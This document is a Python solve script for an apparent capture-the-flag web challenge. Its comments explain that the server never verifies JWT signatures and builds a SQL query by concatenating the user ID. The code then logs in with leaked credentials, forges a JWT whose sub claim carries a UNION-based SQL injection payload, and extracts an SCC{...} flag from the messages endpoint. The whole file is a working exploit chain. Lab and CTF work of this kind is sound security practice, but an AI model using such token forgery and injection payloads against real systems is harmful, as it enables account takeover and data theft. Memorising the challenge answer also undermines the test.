import os
import re

import jwt
import requests

SITE_URL = os.environ["SERVICE_APP_MAIN_ENDPOINT"]

# Note: the credentials handed out in public/creds.txt are for "johmdoe"
# (an intentional typo-squat of the real "johndoe" user that the social
# engineer registered to impersonate him), not "johndoe" itself.
LOGIN_USERNAME = "johmdoe"
LOGIN_PASSWORD = "password123"

# middleware/index.js does `decoded = jwt.decode(token)` instead of
# `jwt.verify(token, SECRET_KEY)`, so the signature is never checked. We can
# therefore forge our own JWT with an arbitrary `sub` claim, signed with any
# key we like, and the server will happily trust it.
#
# routes/index.js then resolves the user with:
#   db.getUserById(req.userId)
# which runs:
#   SELECT * FROM users WHERE id = '${id}'
# Since `id` (our forged `sub`) is concatenated directly into the query with
# no escaping, we can break out of the string literal and UNION in a fake
# user row for any username we want ("account takeover"), then comment out
# the trailing quote with `-- `.
SQLI_PAYLOAD = "x' UNION SELECT 1,'byt3b3nd3r','x'-- "


def main():
    session = requests.Session()

    login_resp = session.post(
        SITE_URL + "/login",
        json={"username": LOGIN_USERNAME, "password": LOGIN_PASSWORD},
        timeout=10,
    )
    login_resp.raise_for_status()
    print("Login response:", login_resp.json())

    original_token = session.cookies.get("token")
    if not original_token:
        raise SystemExit("No token cookie received after login")

    # We never needed the original token's signature/secret; forge a brand
    # new JWT with our own (irrelevant) signing key and the SQLi payload as
    # the `sub` claim.
    forged_token = jwt.encode(
        {"sub": SQLI_PAYLOAD},
        "attacker-controlled-key",
        algorithm="HS256",
    )

    session.cookies.set("token", forged_token)

    messages_resp = session.get(SITE_URL + "/messages", timeout=10)
    messages_resp.raise_for_status()
    data = messages_resp.json()
    print("Messages:", data)

    blob = str(data)
    match = re.search(r"SCC\{[^}]*\}", blob)
    if not match:
        print("Flag not found in response:")
        print(blob)
        raise SystemExit(1)

    print(f"Flag: {match.group(0)}")


if __name__ == "__main__":
    main()
